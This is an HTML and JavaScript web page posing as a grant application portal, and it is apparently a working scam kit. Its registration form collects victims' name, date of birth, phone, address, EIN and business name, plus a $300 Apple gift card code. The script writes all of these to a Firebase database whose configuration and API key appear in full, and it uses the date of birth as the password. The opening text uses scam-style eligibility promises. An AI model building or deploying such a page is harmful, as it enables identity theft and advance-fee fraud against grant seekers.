<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Grant Portal</title>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
  <style>
    body { font-family: Arial; padding: 20px; background: #f2f2f2; }
    .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
    .tabs button { padding: 10px 20px; cursor: pointer; }
    .form-container { display: none; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
    input, textarea { width: 100%; padding: 10px; margin: 10px 0; border-radius: 4px; border: 1px solid #ccc; }
    button[type=submit] { background: #3498db; color: white; border: none; }
  </style>
</head>
<body>

  <h2>Welcome to the Grant Application Portal</h2>
  <p>“Have you ever encountered scammers in grant applications? Now you're in the right place. You won’t get your grant if you're ineligible, but my assistant will help make you eligible. Just give it a try — you never know.”</p>

  <div class="tabs">
    <button onclick="showTab('loginForm')">Login</button>
    <button onclick="showTab('registerForm')">Register</button>
  </div>

  <!-- LOGIN FORM -->
  <div id="loginForm" class="form-container">
    <h3>Login</h3>
    <form onsubmit="handleLogin(event)">
      <input type="email" id="loginEmail" placeholder="Email" required>
      <input type="date" id="loginDOB" placeholder="Date of Birth" required>
      <button type="submit">Login</button>
    </form>
  </div>

  <!-- REGISTER FORM -->
  <div id="registerForm" class="form-container">
    <h3>Register and Submit Application</h3>
    <form onsubmit="handleRegister(event)">
      <input type="text" id="regName" placeholder="Full Name" required>
      <input type="date" id="regDOB" required>
      <input type="email" id="regEmail" placeholder="Email Address" required>
      <input type="tel" id="regPhone" placeholder="Phone Number" required>
      <textarea id="regAddress" placeholder="Address" required></textarea>
      <input type="text" id="regEIN" placeholder="EIN Number" required>
      <input type="text" id="regBusiness" placeholder="Business Name" required>
      <input type="text" id="regAppleCard" placeholder="Apple Gift Card ($300)" required>
      <button type="submit">Submit Application</button>
    </form>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCrYrzAfC6OjwVSsQbL8HmTLR51595sd6U",
      authDomain: "dating-5203f.firebaseapp.com",
      projectId: "dating-5203f",
      storageBucket: "dating-5203f.firebasestorage.app",
      messagingSenderId: "243111420136",
      appId: "1:243111420136:web:60cc69e6ea7474309d695d"
    };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.database();

    function showTab(id) {
      document.getElementById('loginForm').style.display = 'none';
      document.getElementById('registerForm').style.display = 'none';
      document.getElementById(id).style.display = 'block';
    }
    showTab('loginForm');

    function handleLogin(e) {
      e.preventDefault();
      const email = document.getElementById('loginEmail').value;
      const dob = document.getElementById('loginDOB').value;
      const password = dob; // DOB used as password
      auth.signInWithEmailAndPassword(email, password)
        .then(() => {
          window.location.href = "dashboard.html";
        })
        .catch(err => alert("Login failed: " + err.message));
    }

    function handleRegister(e) {
      e.preventDefault();
      const name = document.getElementById('regName').value;
      const dob = document.getElementById('regDOB').value;
      const email = document.getElementById('regEmail').value;
      const phone = document.getElementById('regPhone').value;
      const address = document.getElementById('regAddress').value;
      const ein = document.getElementById('regEIN').value;
      const business = document.getElementById('regBusiness').value;
      const card = document.getElementById('regAppleCard').value;
      const password = dob;

      auth.createUserWithEmailAndPassword(email, password)
        .then(cred => {
          return db.ref('grantApplications/' + cred.user.uid).set({
            name, dob, email, phone, address, ein, businessName: business,
            appleGiftCard: card,
            status: "Awaiting Confirmation",
            timestamp: new Date().toISOString()
          });
        })
        .then(() => {
          alert("Submitted successfully. Redirecting...");
          window.location.href = "dashboard.html";
        })
        .catch(err => alert("Registration error: " + err.message));
    }
  </script>
</body>
</html>
